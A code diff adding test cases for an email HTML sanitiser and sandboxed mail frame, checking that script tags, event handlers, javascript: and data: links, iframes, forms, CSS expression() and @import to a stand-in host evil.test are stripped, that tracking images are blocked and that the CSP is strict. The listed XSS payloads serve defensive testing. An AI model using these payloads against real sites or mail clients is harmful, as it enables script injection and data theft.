@@ -7,6 +7,7 @@
 // owner's name. Nothing else here has all four at once. So this suite is
 // almost entirely about the REFUSALS, and about them happening before a
 // request is built rather than after a provider bounces it.
+import { htmlToText, looksLikeHtml, mailFrameDoc, sanitiseMailHtml } from "../lib/server/mailHtml.js";
 import {
   CAPABILITIES,
   MAIL_PROVIDERS,
@@ -283,6 +284,143 @@ console.log("\nthe query a listing actually sends");
     queryUrl("https://x.test/y", { q: "from:ada is:unread" }).searchParams.get("q") === "from:ada is:unread",
     "and a query with spaces survives encoding"
   );
+}
+
+console.log("\nmail HTML: what must never survive");
+{
+  const esc = (s) => s;
+  // Each of these is a real, documented way markup reaches a parser. They are
+  // asserted here as DEFENCE IN DEPTH: the frame has no allow-same-origin and
+  // the CSP is default-src 'none', so none of them could reach this page even
+  // if one got through. That is the point of testing them anyway -- a
+  // sanitiser nobody checks is a sanitiser nobody can rely on.
+  const attacks = [
+    ["a bare script", '<p>hi</p><script>steal()</script>', /script/i],
+    ["a script with attributes", '<script type="text/javascript" src="//x.test/a.js"></script>', /script/i],
+    ["an unclosed script", '<script>steal()', /script/i],
+    ["an inline handler", '<img src="data:image/gif;base64,R0lGOD" onerror="steal()">', /onerror/i],
+    ["an onload on the body", '<body onload="steal()">x</body>', /onload/i],
+    ["a javascript: link", '<a href="javascript:steal()">click</a>', /javascript:/i],
+    ["an entity-encoded javascript: link", '<a href="java&#115;cript:steal()">click</a>', /javascript:/i],
+    ["a tab-split javascript: link", '<a href="java\tscript:steal()">click</a>', /javascript:/i],
+    ["a data: link", '<a href="data:text/html,<script>steal()</script>">click</a>', /data:text\/html/i],
+    ["an iframe", '<iframe src="//evil.test"></iframe>', /iframe/i],
+    ["an object", '<object data="//evil.test/x.swf"></object>', /<object/i],
+    ["an embed", '<embed src="//evil.test/x">', /<embed/i],
+    ["a form", '<form action="//evil.test"><input name="p"></form>', /<form|<input/i],
+    ["svg with a handler", '<svg><g onload="steal()"></g></svg>', /svg|onload/i],
+    ["a base tag retargeting every link", '<base href="//evil.test/">', /<base/i],
+    ["a meta refresh", '<meta http-equiv="refresh" content="0;url=//evil.test">', /http-equiv/i],
+    ["a stylesheet link", '<link rel="stylesheet" href="//evil.test/a.css">', /<link/i],
+    ["CSS expression()", '<style>b{width:expression(steal())}</style>', /expression\(/i],
+    ["a CSS @import", '<style>@import url("//evil.test/a.css");</style>', /@import/i],
+    ["-moz-binding", '<style>b{-moz-binding:url("//evil.test/x.xml#y")}</style>', /-moz-binding/i],
+    ["a style attribute with expression()", '<p style="width:expression(steal())">x</p>', /expression\(/i],
+    // A conditional comment hides markup from one parser and shows it to
+    // another, so the comment has to go whole rather than be unwrapped.
+    ["markup hidden in a conditional comment", '<!--[if mso]><script>steal()</script><![endif]-->', /script/i],
+  ];
+
+  for (const [name, input, forbidden] of attacks) {
+    const { doc } = mailFrameDoc(input, { nonce: "N0NCE" });
+    const body = doc.slice(doc.indexOf("<body>"));
+    check(!forbidden.test(body.replace(/<script nonce="N0NCE">[\s\S]*?<\/script>/, "")), `${name} does not survive`, esc(body.slice(0, 110)));
+  }
+}
+
+console.log("\nand what must");
+{
+  const { doc } = mailFrameDoc(
+    '<h2>Hello</h2><p><b>bold</b> and <i>italic</i></p><table><tr><td bgcolor="#eee">cell</td></tr></table>' +
+      '<a href="https://example.com/x?a=1&amp;b=2">link</a><blockquote>quoted</blockquote>',
+    { nonce: "N" }
+  );
+  const body = doc.slice(doc.indexOf("<body>"));
+  for (const t of ["<h2>", "<b>", "<i>", "<table", "<td", "<blockquote>"]) {
+    check(body.includes(t), `${t} is kept, because a mail without layout is unreadable`);
+  }
+  check(/href="https:\/\/example\.com/.test(body), "an ordinary link survives");
+  check(/target="_blank"/.test(body), "and opens in a new tab");
+  check(/rel="noopener noreferrer nofollow"/.test(body), "with noopener, since the frame cannot be trusted to the opener");
+  check(/bgcolor="#eee"/.test(body), "presentational attributes mail actually uses are kept");
+
+  const styled = mailFrameDoc('<style>.x{color:red}</style><p class="x">hi</p>', { nonce: "N" }).doc;
+  check(/\.x\{color:red\}/.test(styled), "a <style> block is kept, hoisted and sanitised");
+}
+
+console.log("\na dropped element takes itself and nothing else");
+{
+  // THE bug this block exists for, measured on a real Google security alert:
+  // <link> and <meta> are VOID, so matching them as paired with an
+  // "or end of document" fallback ran from the first one to EOF and deleted
+  // the entire message. The frame rendered blank, nothing errored, and the
+  // mail read as empty rather than as broken.
+  const real =
+    '<!DOCTYPE html><html><head><meta charset="utf-8"><link rel="stylesheet" href="//x/y.css"></head>' +
+    '<body><table><tr><td><div><div><link href="//x/z.css"><meta name="q" content="1"></div></div>' +
+    "<p>THE MESSAGE</p></td></tr></table></body></html>";
+  const { html } = sanitiseMailHtml(real);
+  check(/THE MESSAGE/.test(html), "a void element in the head does not swallow the body", html.slice(0, 90));
+  check(/<table/.test(html) && /<td/.test(html), "and the layout around it is intact");
+  check(!/<link|<meta/i.test(html), "while the void elements themselves are gone");
+
+  // The mirror image: an element that is merely UNCLOSED must not eat the
+  // rest either, unless it is one of the raw-text elements where a real
+  // parser would do exactly that.
+  const unclosed = '<div><form action="//evil.test"><p>STILL HERE</p>';
+  check(/STILL HERE/.test(sanitiseMailHtml(unclosed).html), "an unclosed form does not swallow what follows");
+  const openScript = "<p>BEFORE</p><script>steal()";
+  const after = sanitiseMailHtml(openScript).html;
+  check(/BEFORE/.test(after) && !/steal/.test(after), "but an unclosed script does, which is what a parser does too");
+}
+
+console.log("\nremote images are blocked until asked for");
+{
+  const mail = '<img src="https://track.example/pixel.gif?u=1"><img src="data:image/gif;base64,R0lGOD">';
+  const off = mailFrameDoc(mail, { nonce: "N" });
+  const on = mailFrameDoc(mail, { nonce: "N", allowRemoteImages: true });
+
+  check(off.blockedImages === 1, "a remote image is blocked by default", String(off.blockedImages));
+  check(!/track\.example/.test(off.doc), "and its URL is not in the document at all, so nothing can request it");
+  check(/mbx-blocked-img/.test(off.doc), "it leaves a visible placeholder rather than a gap");
+  check(/img-src data:;/.test(off.doc) || /img-src data:;/.test(off.csp + ";"), "the CSP alone would refuse it", off.csp);
+  check(/data:image\/gif/.test(off.doc), "an image already inside the message still shows");
+
+  check(on.blockedImages === 0, "asking for them lets them through");
+  check(/track\.example/.test(on.doc), "and the URL is then present");
+  check(/img-src data: https: http:/.test(on.csp), "with the CSP widened to match", on.csp);
+
+  // background="" on a cell is a remote image wearing another attribute name,
+  // and it is how a tracker survives a block that only looks at <img>.
+  const bg = mailFrameDoc('<table><tr><td background="https://track.example/b.gif">x</td></tr></table>', { nonce: "N" });
+  check(bg.blockedImages === 1, "a background attribute counts as a remote image too");
+  check(!/track\.example/.test(bg.doc), "and is removed");
+}
+
+console.log("\nthe frame refuses by default, not by omission");
+{
+  const { csp, doc } = mailFrameDoc("<p>hi</p>", { nonce: "ABC" });
+  check(/default-src 'none'/.test(csp), "nothing loads unless it is named", csp);
+  check(/script-src 'nonce-ABC'/.test(csp), "scripts run only under this render's nonce");
+  check(/form-action 'none'/.test(csp), "a form cannot post anywhere");
+  check(/base-uri 'none'/.test(csp), "and nothing can retarget relative URLs");
+  check(/frame-ancestors 'none'/.test(csp), "the document cannot be framed elsewhere");
+  check(/<meta name="referrer" content="no-referrer">/.test(doc), "no referrer leaks to anything it does load");
+  check(/Content-Security-Policy/.test(doc), "and the policy travels inside the document, not as a header we cannot set");
+
+  const noNonce = mailFrameDoc("<p>hi</p>", {});
+  check(/script-src 'none'/.test(noNonce.csp), "with no nonce, nothing executes at all", noNonce.csp);
+  check(!/<script/.test(noNonce.doc), "and no script is written into the document");
+}
+
+console.log("\nthe plain-text view");
+{
+  const t = htmlToText('<p>One</p><p>Two<br>Three</p><script>steal()</script><style>b{}</style>&amp; four');
+  check(!/steal|b\{\}/.test(t), "script and style contents are not text", t);
+  check(/One\nTwo\nThree/.test(t), "block elements become line breaks", JSON.stringify(t));
+  check(/& four/.test(t), "entities are decoded");
+  check(htmlToText("") === "", "and nothing in gives nothing out");
+  check(looksLikeHtml("<p>x</p>") && !looksLikeHtml("just words"), "html is told apart from text");
 }
 
 console.log(`\n${pass} passed, ${fails.length} failed`);
